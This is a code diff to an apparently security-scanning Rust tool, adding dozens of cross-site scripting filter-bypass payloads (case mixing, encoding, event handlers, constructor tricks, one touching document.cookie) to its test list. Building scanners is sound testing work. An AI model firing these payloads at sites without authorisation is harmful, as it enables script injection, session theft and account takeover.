@@ -638,26 +638,84 @@ impl EnhancedXssScanner {
             // Case mixing
             "<sCrIpT>alert(1)</sCrIpT>".to_string(),
 
+            // Case mixing with x attribute (bug bounty tip)
+            "<sCriPt x>(((confirm)))``</scRipt x>".to_string(),
+            "<ScRiPt x>alert(1)</sCrIpT x>".to_string(),
+            "<SCRIPT x>alert(1)</SCRIPT x>".to_string(),
+
+            // Backtick function calls (template literals)
+            "<script>alert`1`</script>".to_string(),
+            "<script>confirm`XSS`</script>".to_string(),
+            "<script>prompt`document.domain`</script>".to_string(),
+            "<img src=x onerror=alert`1`>".to_string(),
+            "<svg onload=alert`1`>".to_string(),
+
+            // Triple parentheses bypass
+            "<script>(((alert)))(1)</script>".to_string(),
+            "<script>(((confirm)))(document.cookie)</script>".to_string(),
+            "<img src=x onerror=(((alert)))(1)>".to_string(),
+
             // Null bytes and comments
             "<script>al/**/ert(1)</script>".to_string(),
+            "<scr\x00ipt>alert(1)</script>".to_string(),
 
             // Encoding variations
             "<script>alert(String.fromCharCode(49))</script>".to_string(),
+            "<script>eval(atob('YWxlcnQoMSk='))</script>".to_string(),
 
             // Unicode bypasses
             "<script>\\u0061lert(1)</script>".to_string(),
+            "<script>\u{0061}lert(1)</script>".to_string(),
 
             // HTML entities
             "<script>&#97;lert(1)</script>".to_string(),
+            "<script>&#x61;lert(1)</script>".to_string(),
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>".to_string(),
 
-            // Line breaks
+            // Line breaks / whitespace
             "<img\nsrc=x\nonerror=alert(1)>".to_string(),
+            "<img\rsrc=x\ronerror=alert(1)>".to_string(),
+            "<img/src=x/onerror=alert(1)>".to_string(),
 
             // Tab characters
             "<img\tsrc=x\tonerror=alert(1)>".to_string(),
 
-            // Multiple encoding
+            // Multiple encoding (URL)
             "%3Cscript%3Ealert(1)%3C%2Fscript%3E".to_string(),
+            "%3Cimg%20src=x%20onerror=alert('I_AM_HERE_!!!')%3E".to_string(),
+            "%3Csvg%20onload=alert(1)%3E".to_string(),
+
+            // Double URL encoding
+            "%253Cscript%253Ealert(1)%253C%252Fscript%253E".to_string(),
+
+            // JavaScript protocol variations
+            "javascript:alert(1)".to_string(),
+            "java\nscript:alert(1)".to_string(),
+            "java\tscript:alert(1)".to_string(),
+            "&#106;avascript:alert(1)".to_string(),
+
+            // Event handler bypasses
+            "<body onpageshow=alert(1)>".to_string(),
+            "<body onfocus=alert(1) autofocus>".to_string(),
+            "<input onfocus=alert(1) autofocus>".to_string(),
+            "<marquee onstart=alert(1)>".to_string(),
+            "<video><source onerror=alert(1)>".to_string(),
+            "<audio src=x onerror=alert(1)>".to_string(),
+
+            // Less common tags
+            "<details open ontoggle=alert(1)>".to_string(),
+            "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>".to_string(),
+            "<isindex action=javascript:alert(1) type=submit value=XSS>".to_string(),
+
+            // Filter bypass with expressions
+            "<img src=x onerror=window['alert'](1)>".to_string(),
+            "<img src=x onerror=this['ale'+'rt'](1)>".to_string(),
+            "<img src=x onerror=top['al'+'ert'](1)>".to_string(),
+            "<img src=x onerror=self[`alert`](1)>".to_string(),
+
+            // Constructor bypass (similar to Vue CSTI)
+            "<img src=x onerror=[].constructor.constructor('alert(1)')()>".to_string(),
+            "<img src=x onerror=Function`alert(1)```>".to_string(),
         ]
     }
 
